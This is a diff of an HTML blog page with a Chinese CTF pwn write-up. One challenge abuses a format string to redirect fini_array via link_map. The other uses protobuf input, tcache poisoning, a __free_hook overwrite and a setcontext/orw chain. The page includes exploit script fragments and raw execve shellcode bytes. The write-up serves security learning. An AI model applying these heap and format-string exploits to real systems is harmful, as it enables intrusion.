@@ -135,7 +135,7 @@
 		 </div> <!-- alert -->
 	  		
 
-	  <h1 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a>sign-format</h1><p><img src="/FILE/10d63cbe7c7433236ed8a177dacbfb8f_MD5.jpeg"><br><img src="/FILE/7c80218a56a1994d0b9786787401b5a7_MD5.jpeg"><br>无pie，有沙盒</p>
+	  <h1 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a>sign-format</h1><p><img src="/EXP_FILE/10d63cbe7c7433236ed8a177dacbfb8f_MD5.jpeg"><br><img src="/EXP_FILE/7c80218a56a1994d0b9786787401b5a7_MD5.jpeg"><br>无pie，有沙盒</p>
 <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><blockquote>
 <p>很简单的程序</p>
 </blockquote>
@@ -152,7 +152,7 @@
   <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>一个bss上的fmt<br><img src="/FILE/00fcf9fecb9625710fcee2508251d2d4_MD5.jpeg"></p>
+<p>一个bss上的fmt<br><img src="/EXP_FILE/00fcf9fecb9625710fcee2508251d2d4_MD5.jpeg"></p>
 </li>
 <li><p>sub_40135D</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_40135D</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -203,11 +203,12 @@
 <p><strong>该函数会根据link_map的l_addr偏移量来调用fini_array段的指针（DT_FINI_ARRAY 这个宏就是 26）</strong><br><code>ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[26]-&gt;d_un.d_ptr);</code></p>
 <p>接触过house of banana的师傅应该很熟悉</p>
 <ul>
-<li><p>我们来看看l-&gt;l_addr的地址：<br><img src="/FILE/1a1955426feca2b49eb6230d546cd830_MD5.jpeg"><br>这个地址好像很熟悉？没错正是栈上的一个粉颜色地址（断点在printf）：<br><img src="/FILE/c31894cd1628ce9e396360a0873f20a7_MD5.jpeg"><br>我们能够利用fmt控制l-&gt;l_addr</p>
+<li><p>我们来看看l-&gt;l_addr的地址：<br><img src="/EXP_FILE/1a1955426feca2b49eb6230d546cd830_MD5.jpeg"><br>这个地址好像很熟悉？没错正是栈上的一个粉颜色地址（断点在printf）：<br><img src="/EXP_FILE/c31894cd1628ce9e396360a0873f20a7_MD5.jpeg"><br>我们能够利用fmt控制l-&gt;l_addr</p>
 </li>
-<li><p>再看看l-&gt;l_info[26]-&gt;d_un.d_ptr，可见其值为0x403d98<br><img src="/FILE/66b2e055748333139fe47fdc27e46ccb_MD5.jpeg"><br>0x403d98？这其实就是.fini_array段的地址<br><img src="/FILE/fe64b6ba91dbfa3d0ac3eae67f97e737_MD5.jpeg"></p>
+<li><p>再看看l-&gt;l_info[26]-&gt;d_un.d_ptr，可见其值为0x403d98</p>
 </li>
 </ul>
+<p><img src="/EXP_FILE/66b2e055748333139fe47fdc27e46ccb_MD5.jpeg"><br>0x403d98？这其实就是.fini_array段的地址<br><img src="/EXP_FILE/fe64b6ba91dbfa3d0ac3eae67f97e737_MD5.jpeg"></p>
 <hr>
 <p>那么我们思路很明显了，控制l-&gt;addr使得array指向bss段，在bss上写上orw的shellcode和orw的指针，在<code>((fini_t) array[i]) ();</code>就会调用orw指针执行shellcode</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span>
@@ -280,11 +281,11 @@ choose<span class="token operator">=</span><span class="token number">1</span>
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
 	pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
 	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/FILE/d5979ae7620a1e44c7a96ef663584525_MD5.jpeg"></p>
+<p><img src="/EXP_FILE/d5979ae7620a1e44c7a96ef663584525_MD5.jpeg"></p>
 <h1 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h1><blockquote>
 <p>一道4解题，在赛后解出来了😠</p>
 </blockquote>
-<p>【2.31-0ubuntu9.12】堆风水，protobuf序列化，2.31堆沙盒<br>保护全开，还是沙盒<br><img src="/FILE/05e598de0cef3e5612840f8346e8972a_MD5.jpeg"></p>
+<p>【2.31-0ubuntu9.12】堆风水，protobuf序列化，2.31堆沙盒<br>保护全开，还是沙盒<br><img src="/EXP_FILE/05e598de0cef3e5612840f8346e8972a_MD5.jpeg"></p>
 <h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>有增删查改四个功能，不过在开始的choose上就难住了我们</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// choose</span>
@@ -312,11 +313,11 @@ choose<span class="token operator">=</span><span class="token number">1</span>
   <span class="token keyword">default</span><span class="token operator">:</span>
     <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>依据v3来进行选择，而v3&#x3D;*(v5+32)；而v5由<code>v5 = sub_1C15(0LL, v4, buf);</code>得到，其中v4是我们输入的长度，buf是输入的内容。这个函数如下：<br><img src="/FILE/cfeb9470b6c5445a203d0a8bd3a33a57_MD5.jpeg"><br>这貌似是一个解包函数，对我们的输入内容进行解包。经过浏览器搜索可知是protobuf序列化，我们需要传入一个结构体并进行protobuf打包，网上教程很多，在此不再赘述</p>
+<p>依据v3来进行选择，而v3&#x3D;*(v5+32)；而v5由<code>v5 = sub_1C15(0LL, v4, buf);</code>得到，其中v4是我们输入的长度，buf是输入的内容。这个函数如下：<br><img src="/EXP_FILE/cfeb9470b6c5445a203d0a8bd3a33a57_MD5.jpeg"><br>这貌似是一个解包函数，对我们的输入内容进行解包。经过浏览器搜索可知是protobuf序列化，我们需要传入一个结构体并进行protobuf打包，网上教程很多，在此不再赘述</p>
 <blockquote>
 <p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p>
 </blockquote>
-<p>如何确定结构体成员，在.data.rel.ro段看出了端倪<br><img src="/FILE/2b362bd22552955f8a8ff30bba5dff1d_MD5.jpeg"><br>再经过对各功能函数偏移的分析，可知结构体如下：</p>
+<p>如何确定结构体成员，在.data.rel.ro段看出了端倪<br><img src="/EXP_FILE/2b362bd22552955f8a8ff30bba5dff1d_MD5.jpeg"><br>再经过对各功能函数偏移的分析，可知结构体如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg</span> <span class="token punctuation">&#123;</span>
 	<span class="token keyword">char</span><span class="token operator">*</span> flag <span class="token punctuation">;</span>
 	<span class="token keyword">long</span> <span class="token keyword">int</span> choice<span class="token punctuation">;</span>
@@ -398,7 +399,7 @@ choose<span class="token operator">=</span><span class="token number">1</span>
 </ul>
 <h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>输入的size只能在0x80以内，我们只能得到tcachebin chunk和fastbin chunk，对于利用我们有以下几个难题：</p>
 <ol>
-<li><p>泄露libc：没有unsortedbin chunk，想过利用malloc_consolidate得到unsortedbin chunk，但是申请chunk时会出现0x40和0x20的chunk与其它chunk分隔开，无法free进行合并<br><img src="/FILE/bb03948443ab05b5e93b62ace2b52815_MD5.jpeg"><br>对策：我们能得到堆地址，利用tcache posioning篡改其它tcache chunk-&gt;size，得到unsortedbin chunk</p>
+<li><p>泄露libc：没有unsortedbin chunk，想过利用malloc_consolidate得到unsortedbin chunk，但是申请chunk时会出现0x40和0x20的chunk与其它chunk分隔开，无法触发malloc_consolidate来合并fastbin<br><img src="/EXP_FILE/bb03948443ab05b5e93b62ace2b52815_MD5.jpeg"><br>对策：我们能得到堆地址，利用tcache posioning篡改其它tcache chunk-&gt;size，得到unsortedbin chunk</p>
 </li>
 <li><p>要打2.31的orw，0x80的chunk大小无法容纳srop_frame</p>
 </li>
@@ -409,13 +410,10 @@ choose<span class="token operator">=</span><span class="token number">1</span>
    <span class="token number">0x7f0d55f0f934</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">580</span><span class="token operator">></span>    mov    qword ptr <span class="token punctuation">[</span>rsp<span class="token punctuation">]</span><span class="token punctuation">,</span> rax
    <span class="token number">0x7f0d55f0f938</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">584</span><span class="token operator">></span>    call   qword ptr <span class="token punctuation">[</span>rdx <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>我们不需要控制全部的frame，只需要frame的rsp和rip位，偏移为0xa8：<br><img src="/FILE/5fe5d0ad0378ccfb9017c1b96c86bc75_MD5.jpeg"></p>
-<p>我们可以利用堆风水技巧，这样进行堆的排布：<br><img src="/FILE/71e0ae5f8f3ea8db7539e6b75eca7e52_MD5.jpeg"></p>
+<p>我们不需要控制全部的frame，只需要frame的rsp和rip位，偏移为0xa8：<br><img src="/EXP_FILE/5fe5d0ad0378ccfb9017c1b96c86bc75_MD5.jpeg"></p>
+<p>我们可以利用堆风水技巧，这样进行堆的排布：<br><img src="/EXP_FILE/71e0ae5f8f3ea8db7539e6b75eca7e52_MD5.jpeg"></p>
 <ol start="3">
-<li>chunk无法容纳：要打2.31的orw，0x80的chunk大小无法容纳0xa8的orwchain<br>对策：既然我们能控制执行流了，直接调用read进行堆上写并调用，然后我们手动发送orw即可<br><img src="/FILE/b560713c1f4f0f1fa9088f95f44bada5_MD5.jpeg"></li>
-</ol>
-<p>EXP：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span>
+<li>chunk无法容纳：要打2.31的orw，0x80的chunk大小无法容纳0xa8的orwchain<br>对策：既然我们能控制执行流了，直接调用read进行堆上写并调用，然后我们手动发送orw即可<br><img src="/EXP_FILE/b560713c1f4f0f1fa9088f95f44bada5_MD5.jpeg"><br>EXP：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span>
 <span class="token comment"># -*- coding: utf-8 -*-</span>
 <span class="token comment">#@Author:X1NRI</span>
 she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>
@@ -525,7 +523,7 @@ choose<span class="token operator">=</span><span class="token number">1</span>
 	add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
 	
 	getkeyserv_handle_576<span class="token operator">=</span><span class="token number">0x0000000000151990</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
-	<span class="token comment">#-----------getkeyserv_handle_576</span>
+	<span class="token comment">#---------getkeyserv_handle_576</span>
 	add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>getkeyserv_handle_576<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#__free_hook</span>
 	add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
 	add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'frame1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'frame1chunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x930</span><span class="token punctuation">)</span><span class="token comment">#setcontext</span>
@@ -566,9 +564,9 @@ choose<span class="token operator">=</span><span class="token number">1</span>
 	itr<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
 	pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>xinri.proto：</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<p>x1nri.proto：</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">syntax = "proto2";
  
 package tutorial;
@@ -673,7 +671,7 @@ _sym_db<span class="token punctuation">.</span>RegisterMessage<span class="token
 
 
 <span class="token comment"># @@protoc_insertion_point(module_scope)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/FILE/eb74957d1f02605e6c0211d828d8d75a_MD5.jpeg"></p>
+<p><img src="/EXP_FILE/eb74957d1f02605e6c0211d828d8d75a_MD5.jpeg"></p>
 
 	  <div class="article-footer-copyright">
 
